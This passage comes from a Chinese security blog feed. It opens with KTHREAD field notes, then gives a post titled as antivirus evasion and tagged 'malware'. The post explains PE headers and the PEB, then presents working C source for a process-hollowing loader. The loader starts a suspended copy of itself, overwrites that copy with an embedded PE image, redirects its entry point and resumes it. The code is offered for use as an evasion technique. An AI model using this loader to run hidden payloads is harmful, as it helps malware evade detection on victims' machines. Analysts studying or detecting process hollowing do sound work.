*PKTHREAD;</span><br></pre></td></tr></table></figure><p>Header：说明该对象是一个分发器对象，可以被等待。线程结束时，等待被满足。</p><p>MutantListHead：指向一个链表头。链表中包含所有属于该线程的突变体对象（mutant，对应互斥体对象）。</p><p>InitialStack：原始栈位置（高地址）</p><p>StackLimit：栈低地址</p><p>KernelStack：内核调用栈开始位置</p><p>StackBase：当前栈的基地址。</p><p>ThreadLock：自旋锁，用于保护线程数据成员。</p><p>ApcState：KAPC_STATE结构，指定线程的APC信息，包括APC链表，是否有APC正在等待，是否正在处理APC。</p><p>ApcQueueable：是否可插入APC</p><p>NextProcessor：关于处理器调度的选择。</p><p>DeferredProcessor：关于处理器调度的选择。</p><p>AdjustReason：优先级调整原因</p><p>AdjustIncrement：优先级调整调整量</p><p>ApcQueueLock：保护APC队列的自旋锁。</p><p>ContextSwitches：记录线程进行了多少次切换。</p><p>State：线程当前状态。</p><p>NpxState：浮点处理器状态。</p><p>Alertable：线程是否可以被唤醒。</p><p>WaitNext：</p><p>WaitIrql：原先的IRQL。</p><p>WaitReason：等待原因</p><p>WaitMode：线程等待时的处理器模式，内核or用户</p><p>WaitStatus：等待的结果状态。</p><p>WaitBlockList：KWAIT_BLOCK为元素的链表，记录线程所有等待的分发器对象。每个分发器对象也有一个KWAIT_BLOCK组成的链表，记录所有等待在该对象的线程。</p><p>GateObject：等待的门对象，等待门对象和等待分发器对象不会同时发生。</p><p>Priority：动态优先级。</p><p>BasePriority：基本优先级。</p><p>PriorityDecrement：优先级动态调整过程中的递减值。</p><p>Saturation：线程基本优先级调整相对于进程基本优先级是否超过了区间的一半。</p><p>EnableStackSwap：内核栈是否准许被换出。</p><p>SwapBusy：当前是否正在进程上下文切换。</p><p>Alerted：线程在警告模式下是否可以被唤醒。</p><p>WaitListEntry：双向链表节点，等待被执行时，作为节点加入某链表</p><p>SwapListEntry：单链表节点，内核栈需要被换出时，加入KiStackInSwapListHead为头的链表。另外，线程处于DeferredReady状态时加入DeferredReadyListHead为头的链表。</p><p>Queue：队列分发器对象，线程正在处理此队列中的项。</p><p>WaitTime：线程进入等待时刻的时间点。</p><p>KernelApcDisable/SpecialApcDisable：内核APC和特殊内核APC是否被禁止。</p><p>TEB：进程地址空间的一个TEB域</p><p>Timer：定时器。</p><p>AutoAlignment：与KPROCESS相同</p><p>DisableBoost：与KPROCESS相同</p><p>WaitBlock：4个KWAIT_BLOCK成员的数组，线程等待的分发器少于4个时，使用这里的空间，不分配新空间。</p><p>QueueListEntry：线程处理一个队列项时，加入到队列对象的线程链表中的地址。</p><p>TrapFrame：指向KTRAP_FRAME类型的指针。用户保存执行现场。</p><p>CallbackStack：线程的回调栈地址，在从内核模式返回用户模式时用。</p><p>ServiceTable： 指向系统使用的系统服务表，非GUI线程为KeServiceDescriptorTable，GUI线程为KeServiceDescriptorTableShadow。</p><p>IdealProcess：理想处理器</p><p>Preempted：是否被高优先级线程抢占了。</p><p>ProcessReadyQueue：是否在进程对象的ReadyListHead列表中。</p><p>KernelStackResident：线程的内核栈是否驻留在线程中。</p><p>Affinity：处理器亲和性，为线程指定的处理器集合必须是该集合的子集。</p><p>UserAffinity：线程的用户亲和性。</p><p>Process：执行线程的进程对象。</p><p>ApcStateIndex：指明当前APC状态在ApcStatePointer域中的索引。</p><p>Win32Thread：指向Windows子系统管理的区域的指针。</p><p>SuspendApc/SuspendSemaphore：用于支持线程挂起的域。</p><p>ThreadListEntry：双链表的节点，线程被创建时，加入到进程的ThreadListHead链表中。</p><p>SListFaultAddress：上一次用户模式互锁单链表POP操作发生页面错误的地址。</p><p>SuspendSemaphore：与上面有关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows中进程与线程的设置&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】内存加载PE文件</title>
    <link href="https://joe1sn.eu.org/2023/06/13/pe-loader/"/>
    <id>https://joe1sn.eu.org/2023/06/13/pe-loader/</id>
    <published>2023-06-13T00:46:20.000Z</published>
    <updated>2023-06-13T05:14:54.198Z</updated>
    
    <content type="html"><![CDATA[<p>使用windows API编写PE文件加载器（Loader）<br />目前支支持32位</p><span id="more"></span><h1 id="pe文件结构"><a class="markdownIt-Anchor" href="#pe文件结构"></a> PE文件结构</h1><p>在《逆向工程核心原理》中讲的已经很详细了，这里主要面向32位的可执行程序来讲解。</p><p><img src="https://img.joe1sn.top/uploads/big/0cdf49890a47067a93b43fd16ec19448.png" alt="MZ" /></p><p>DOS头和PE头统称为PE头，下面的部分称之为PE体。</p><h2 id="dos头"><a class="markdownIt-Anchor" href="#dos头"></a> DOS头</h2><p>DOS头的文件结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// 文件最后一页的字节数</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// 文件中的页数</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// 重定位</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// 段中头大小</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// 需要最少的额外段落</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// 需要最多的额外段落</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// 初始（相对）SS 值</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// 初始SP值</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// 初始 IP 值</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// 初始（相对）CS 值</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// 重定位表的文件地址</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// 叠加数</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// 保留字</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM 标识符（用于 e_oeminfo）</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM信息； e_oemid 具体</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// 保留字</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// 新exe头文件地址</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>其中DOS头有一个很重要的部分<code>e_lfanew</code>，他指向了exe的文件头，在我们编写的loader获取头的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//得到DOS头</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//得到PE头</span></span><br></pre></td></tr></table></figure><h2 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h2><p>那么关于NT文件头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">//文件类型</span></span><br><span class="line">                    <span class="comment">// IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE                 0x454E      // NE</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE_LE              0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_VXD_SIGNATURE                 0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_NT_SIGNATURE                  0x00004550  // PE00</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>这个文件头很关键，Signature可以判断类型，FileHeader即文件头，可以从<code>NumberOfSections</code>获得节区数目。</p><p>OPTIONAL_HEADER结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>OPTIONAL_HEADER中记载了很多详细信息，其中有用的就是<code>ImageBase</code>、<code>SizeOfHeaders</code>和<code>AddressOfEntryPoint</code></p><ul><li><code>ImageBase</code>：描写在虚拟内存中（不了解操作系统的话可以理解为程序启动的基地址）的地址</li><li><code>SizeOfHeaders</code>：记录了整个PE头的大小（包含DOS头），方便控制写入程序的大小</li><li><code>AddressOfEntryPoint</code>：<strong>记录程序入口代码起始地址</strong>，比如<code>ImageBase</code>可能为0x4000，<code>AddressOfEntryPoint</code>可能为0x4100。</li></ul><h2 id="iat导入表"><a class="markdownIt-Anchor" href="#iat导入表"></a> IAT导入表</h2><p>Windows为了知道使用了那些函数，会导入这些函数的表，从导入表到动态链接中查找函数。每一个节都会有一个导入表，每一个表的信息有40字节，那么找到表的地址就是<code>base + count*40</code>，其中<code>base</code>为<code>DOSHeader-&gt;e_lfanew+248</code>，这里是导入表的初始地址的指针。</p><h1 id="进程结构"><a class="markdownIt-Anchor" href="#进程结构"></a> 进程结构</h1><h2 id="pre-peb"><a class="markdownIt-Anchor" href="#pre-peb"></a> Pre- PEB</h2><p>这部分是铺垫的内容，主要描述的就是几个基础寄存器。</p><p>这些寄存器是CPU中设计好的，</p><ul><li>CS (Code Segment Register)：代码段的段基址</li><li>DS(Data Segment Register)：数据段的段基址</li><li>ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。</li><li>FS(Extra Segment Register)：其值为附加数据段的段基值</li><li>GS：同上</li><li>SS(Stack Segment Register)：堆栈段寄存器</li></ul><ol><li>在实模式中，CS、DS、ES、SS中的值是物理地址</li><li>在保护模式中，装入寄存器的是<strong>段选择子FS</strong></li></ol><p>其中最重要的就是 <strong>FS寄存器</strong>。在保护模式下，x86处理器使用段描述符来管理内存，将内存划分为不同的段，如代码段、数据段、堆栈段等。段选择子是一个16位的值，用于标识特定段的起始地址和访问权限。</p><p>FS寄存器主要有两个作用：</p><ol><li>定位线程局部存储（Thread Local Storage，TLS）：<ul><li>在多线程程序中，每个线程通常都有自己的TLS，用于存储线程本地的数据，如线程特定变量。</li><li>FS寄存器中存储了一个特殊的段选择子，用于定位线程的TLS。</li><li>线程可以通过访问FS寄存器来访问自己的TLS。</li></ul></li><li>访问段描述符表（Global Descriptor Table，GDT）：<ul><li>GDT是一个表格，用于存储段描述符的信息，包括段的起始地址、大小、访问权限等。</li><li>FS寄存器中存储了GDT中的一个段选择子，该段选择子指向了一个描述线程局部存储段的段描述符。</li><li>当线程需要访问TLS时，通过访问FS寄存器中的段选择子，可以获得TLS的起始地址和访问权限。</li></ul></li></ol><h2 id="peb"><a class="markdownIt-Anchor" href="#peb"></a> PEB</h2><p>PEB全称是 Process Environment Block，进程环境块</p><p>为了获取PEB的消息可以直接从FS段选择子找到TEB（线程环境块），再从TEB找到PEB，这里可以<code>CTX-&gt;Ebx + 8</code>找到PEB</p><h2 id="编程相关"><a class="markdownIt-Anchor" href="#编程相关"></a> 编程相关</h2><p>创建一个进程我们可以使用<code>CreateProcess</code>函数</p><blockquote><p>新进程在调用进程的安全上下文中运行。</p><p>如果调用进程正在模拟其他用户，则新进程将令牌用于调用进程，而不是模拟令牌。 若要在模拟令牌表示的用户的安全上下文中运行新进程，请使用 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a> 或 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW</a> 函数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcessA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]                BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  [in]                DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="line"><span class="params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>lpApplicationName</code>：exe的文件路径，比如<code>c:\test.exe</code></p></li><li><p><code>lpCommandLine</code>：要执行该程序时的参数</p></li><li><p><code>bInheritHandles</code>：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。 如果参数为 FALSE，则不继承句柄。</p></li><li><p><code>dwCreationFlags</code>：控制优先级类和进程的<strong>创建的标志</strong>。</p></li><li><p><code>lpProcessInformation</code>：进程信息</p><p>windows中使用<code>PROCESS_INFORMATION</code>描述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    HANDLE hProcess;<span class="comment">//新创建的进程的句柄。 句柄用于在对进程对象执行操作的所有函数中指定进程。</span></span><br><span class="line">    HANDLE hThread;<span class="comment">//新创建的进程的主线程的句柄。 句柄用于在线程对象上执行操作的所有函数中指定线程。</span></span><br><span class="line">    DWORD dwProcessId;<span class="comment">//可用于标识进程的值。 从创建进程到进程的所有句柄关闭并释放进程对象为止，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">    DWORD dwThreadId;<span class="comment">//可用于标识线程的值。 在线程创建到线程的所有句柄关闭且线程对象释放之前，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure></li><li><p><code>lpStartupInfo</code>：启动时的信息</p><p>同时如果要开启一个进程的话需要向其提供基础环境，windows中为<code>STARTUPINFOA</code>，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">    DWORD   cb;<span class="comment">//结构大小（以字节为单位）。</span></span><br><span class="line">    LPSTR   lpReserved;<span class="comment">//保留;必须为 NULL</span></span><br><span class="line">    ...</span><br><span class="line">    DWORD   dwFlags;<span class="comment">//一个位字段，用于确定进程创建窗口时是否使用某些 STARTUPINFO 成员。 此成员可以是以下一个或多个值。</span></span><br><span class="line">    <span class="comment">//参考 https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa</span></span><br><span class="line">   ...</span><br><span class="line">    WORD    cbReserved2;<span class="comment">//保留供 C 运行时使用;必须为零。</span></span><br><span class="line">    LPBYTE  lpReserved2;<span class="comment">//保留供 C 运行时使用;必须为 NULL。</span></span><br><span class="line">    HANDLE  hStdInput;</span><br><span class="line">    HANDLE  hStdOutput;</span><br><span class="line">    HANDLE  hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure></li></ul><p>最后创建好的进程就在<code>lpProcessInformation</code>的<code>hProcess</code>中了</p><h1 id="编写loader进程镂空"><a class="markdownIt-Anchor" href="#编写loader进程镂空"></a> 编写Loader（进程镂空）</h1><p>知道了加载过程，那么</p><ol><li>获得DOS头，从而获得NT头</li><li>检查是否为正确的文件格式（PE）</li><li>初始化进程信息和启动时信息</li><li>创建当前程序进程的副本，并将副本设置为暂停</li><li>根据上下文信息找到导入表和PEB</li><li>复制导入表和PEB，将EAX设置为待加载PE文件的入口地址<code>DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</code></li><li>恢复暂停的副本，运行加载的PE文件</li></ol><p><img src="https://cdn-images.postach.io/1048057d-e83d-423e-a47b-f4c6f4737870/b9621a0e-f58d-43f9-8b52-331139f11008/8f876f09-767b-46d4-a370-627f87733e68.png" alt="img" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RunPe</span><span class="params">(HANDLE Image)</span></span><br><span class="line">&#123;</span><br><span class="line">IMAGE_DOS_HEADER* DOSHeader;<span class="comment">//DOS文件头</span></span><br><span class="line">IMAGE_NT_HEADERS* NTHeader;<span class="comment">//PE文件头</span></span><br><span class="line">IMAGE_SECTION_HEADER* SectionHeader;<span class="comment">//节头</span></span><br><span class="line"></span><br><span class="line">PROCESS_INFORMATION PI;<span class="comment">//进程信息</span></span><br><span class="line">STARTUPINFOA SI;<span class="comment">//启动信息</span></span><br><span class="line"></span><br><span class="line">DWORD* ImageBase;<span class="comment">//VAR基地址</span></span><br><span class="line"><span class="type">void</span>* pImageBase;<span class="comment">//指向头的指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="type">char</span> FilePath[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);<span class="comment">//得到DOS头</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);<span class="comment">//得到PE头</span></span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, FilePath, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;<span class="comment">//检查是否为PE文件</span></span><br><span class="line">ZeroMemory(&amp;PI, <span class="keyword">sizeof</span>(PI));</span><br><span class="line">ZeroMemory(&amp;SI, <span class="keyword">sizeof</span>(SI));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CreateProcessA(FilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;<span class="comment">//创建当前进程的暂停副本</span></span><br><span class="line">CONTEXT *CTX = PCONTEXT(VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">CTX-&gt;ContextFlags = CONTEXT_FULL;<span class="comment">//创建上下文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123;<span class="comment">//如果上下文在线程中</span></span><br><span class="line"><span class="comment">//读取指令</span></span><br><span class="line">ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + <span class="number">8</span>), LPVOID(&amp;ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase),</span><br><span class="line">NTHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向进程的暂停副本写入指令</span></span><br><span class="line">WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+<span class="number">248</span>+(count*<span class="number">40</span>));</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),</span><br><span class="line">LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + <span class="number">8</span>),</span><br><span class="line">LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将入口地址放入EAX寄存器</span></span><br><span class="line">CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">SetThreadContext(PI.hThread, LPCONTEXT(CTX));</span><br><span class="line">ResumeThread(PI.hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rawData[<span class="number">91209</span>] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">RunPe(rawData);</span><br><span class="line"><span class="comment">//getchar();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d594572b354d7f3a546c13620b64d316.png" alt="result" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用windows API编写PE文件加载器（Loader）&lt;br /&gt;
目前支支持32位&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Muud开发】2.HTTP服务改善</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x2/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x2/</id>
